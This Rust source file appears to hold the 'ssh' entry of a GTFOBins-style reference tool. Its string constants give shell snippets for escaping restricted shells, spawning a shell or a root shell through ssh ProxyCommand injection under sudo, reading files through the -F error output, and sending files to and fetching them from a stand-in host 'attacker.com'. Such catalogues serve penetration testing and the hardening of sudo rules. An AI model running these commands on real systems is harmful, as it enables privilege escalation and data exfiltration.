pub static BIN_NAME: &'static str = "ssh";
pub static SH_DESC_1: &'static str = "Reconnecting may help bypassing restricted shells.";
pub static SH_CODE_1: &'static str = r#"
    
    ssh localhost $SH --noprofile --norc
"#;
pub static SH_DESC_2: &'static str = "Spawn interactive shell through ProxyCommand option.";
pub static SH_CODE_2: &'static str = r#"
    
    ssh -o ProxyCommand=';sh 0<&2 1>&2' x
"#;
pub static SH_DESC_3: &'static str =
    "Spawn interactive shell on client, requires a successful connection towards `host`.";
pub static SH_CODE_3: &'static str = r#"
    
    ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh host
"#;
pub static FU_DESC: &'static str = "Send local file to a SSH server.";
pub static FU_CODE: &'static str = r#"
    
    HOST=user@attacker.com
    RPATH=file_to_save
    LPATH=file_to_send
    ssh $HOST "cat > $RPATH" < $LPATH
"#;
pub static FD_DESC: &'static str = "Fetch a remote file from a SSH server.";
pub static FD_CODE: &'static str = r#"
    
    HOST=user@attacker.com
    RPATH=file_to_get
    LPATH=file_to_save
    ssh $HOST "cat $RPATH" > $LPATH
"#;
pub static FR_DESC: &'static str = "The read file content is corrupted by error prints.";
pub static FR_CODE: &'static str = r#"
    
    LFILE=file_to_read
    ssh -F $LFILE localhost
"#;
pub static SUDO_DESC: &'static str = "Spawn interactive root shell through ProxyCommand option.";
pub static SUDO_CODE: &'static str = r#"
    
    sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
"#;
use crate::code::{Code, Tag};
pub static SH_1: Code<'static> = Code {
    title: "SH_CODE_1",
    code: SH_CODE_1,
    tag: Tag::SH,
};
pub static SH_2: Code<'static> = Code {
    title: "SH_CODE_2",
    code: SH_CODE_2,
    tag: Tag::SH,
};
pub static SH_3: Code<'static> = Code {
    title: "SH_CODE_3",
    code: SH_CODE_3,
    tag: Tag::SH,
};
pub static FU: Code<'static> = Code {
    title: "FU_CODE",
    code: FU_CODE,
    tag: Tag::FU,
};
pub static FD: Code<'static> = Code {
    title: "FD_CODE",
    code: FD_CODE,
    tag: Tag::FD,
};
pub static FR: Code<'static> = Code {
    title: "FR_CODE",
    code: FR_CODE,
    tag: Tag::FR,
};
pub static SUDO: Code<'static> = Code {
    title: "SUDO_CODE",
    code: SUDO_CODE,
    tag: Tag::SUDO,
};
